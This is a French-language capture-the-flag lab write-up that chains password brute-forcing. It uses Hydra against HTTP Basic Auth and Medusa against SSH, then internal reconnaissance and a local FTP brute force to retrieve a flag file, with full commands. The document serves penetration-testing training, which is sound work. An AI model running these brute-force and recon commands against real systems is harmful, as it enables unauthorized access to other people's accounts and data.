# Lab - Brute force en chaine

## Scenario

L'evaluation se deroule en deux parties. La premiere cible un service web protege par une Basic Auth HTTP. Une fois les credentials trouvees, la page revele un nom d'utilisateur qui sert de point de depart pour la seconde partie : brute force SSH, puis reconnaissance interne et brute force FTP local pour recuperer un fichier sensible.

## Approche

### Partie 1 : Basic Auth HTTP

1. Scanner le service web pour identifier le type d'authentification (Basic Auth dans ce cas)
2. Preparer les wordlists : `top-usernames-shortlist.txt` pour les logins, `2023-200_most_used_passwords.txt` pour les mots de passe
3. Lancer Hydra avec le module `http-get`
4. Se connecter avec les credentials trouvees et recuperer les informations de la page

### Partie 2 : SSH et pivot FTP

1. Utiliser le nom d'utilisateur obtenu en partie 1 pour brute-forcer le service SSH
2. Se connecter en SSH et scanner les ports locaux (`netstat` ou `nmap localhost`)
3. Identifier le service FTP interne et le nom d'utilisateur potentiel (via `/home/`)
4. Brute-forcer le FTP en local avec Medusa
5. Se connecter en FTP et recuperer le fichier cible

## Commandes

### Partie 1 : Brute force Basic Auth

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
      -f <IP_CIBLE> -s <PORT> http-get /
```

### Partie 2 : Brute force SSH

```bash
medusa -h <IP_CIBLE> -n <PORT> -u <USER_TROUVE> \
       -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
       -M ssh -f -t 3
```

### Connexion SSH et reconnaissance

```bash
ssh <USER_TROUVE>@<IP_CIBLE> -p <PORT>

# Scanner les ports locaux
netstat -tulpn | grep LISTEN

# Identifier les utilisateurs FTP
ls /home/
```

### Brute force FTP local

```bash
medusa -h 127.0.0.1 -u <FTP_USER> \
       -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
       -M ftp -f -t 5
```

### Recuperation du fichier

```bash
ftp <FTP_USER>@localhost
# Entrer le mot de passe
ftp> ls
ftp> get flag.txt
ftp> exit

cat flag.txt
```

## Ce qu'on en retient

- Le brute force est rarement un exercice isole. En engagement, trouver des credentials ouvre la porte a de nouvelles surfaces d'attaque. Le vrai travail commence apres le premier acces.
- La reconnaissance interne (ports locaux, utilisateurs, services) est une etape critique apres chaque acces obtenu. Un `netstat` ou un `nmap localhost` peut reveler des services invisibles de l'exterieur.
- Hydra et Medusa sont complementaires. Hydra excelle sur HTTP, Medusa est plus stable sur SSH. Choisir l'outil adapte au service.
- Les wordlists courtes (200 mots de passe les plus courants) suffisent souvent pour les services mal configures. Pas besoin de lancer rockyou.txt systematiquement.
- Toujours utiliser `-f` pour stopper au premier succes. Sans cette option, l'outil continue de tester toutes les combinaisons, ce qui est inutile une fois les credentials trouvees et genere du bruit supplementaire.

***
